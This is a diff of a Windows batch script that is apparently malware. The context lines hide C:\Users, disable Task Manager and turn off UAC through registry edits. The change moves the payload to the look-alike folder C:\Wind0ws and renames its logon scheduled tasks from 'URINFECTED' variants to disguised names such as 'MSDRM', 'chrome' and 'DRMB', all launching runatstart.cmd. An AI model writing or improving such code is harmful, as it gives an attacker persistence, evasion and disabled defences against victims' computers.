@@ -34,13 +34,16 @@ ATTRIB +s +h C:\Users
 
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 
-SchTasks /Create  /SC ONLOGON /TN "URINFECTED"  /TR C:\Wind\runatstart.cmd
+SchTasks /Create  /SC ONLOGON /TN "URINFECTED"  /TR C:\Wind0ws\runatstart.cmd
  reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 
-SchTasks /Create  /SC ONLOGON /TN "URINFECTED1"  /TR C:\Wind\runatstart.cmd
-SchTasks /Create  /SC ONLOGON /TN "URINFECTEDe"  /TR C:\Wind\runatstart.cmd
- SchTasks /Create  /SC ONLOGON /TN "URINFECTED4"  /TR C:\Wind\runatstart.cmd
- SchTasks /Create  /SC ONLOGON /TN "URINFECTE3D"  /TR C:\Wind\runatstart.cmd
- SchTasks /Create  /SC ONLOGON /TN "URI22edNFECTED"  /TR C:\Wind\runatstart.cmd
- SchTasks /Create  /SC ONLOGON /TN "URINFECewTED"  /TR C:\Wind\runatstart.cmd
+
+SchTasks /Create  /SC ONLOGON /TN "MSDRM"  /TR  C:\Wind0ws\runatstart.cmd
+SchTasks /Create  /SC ONLOGON /TN "drm"  /TR t C:\Wind0ws\runatstart.cmd
+ SchTasks /Create  /SC ONLOGON /TN "chrome"  /TR  C:\Wind0ws\runatstart.cmd
+ SchTasks /Create  /SC ONLOGON /TN " C:\Windows\basedrm"  /TR C:\Wind0ws\runatstart.cmd
+ SchTasks /Create  /SC ONLOGON /TN "DRMB1"  /TR  C:\Wind0ws\runatstart.cmd
+ SchTasks /Create  /SC ONLOGON /TN "DRMB"  /TR C:\Wind0ws\runatstart.cmd
+
+md   C:\Wind0ws
 Sqet.cmd
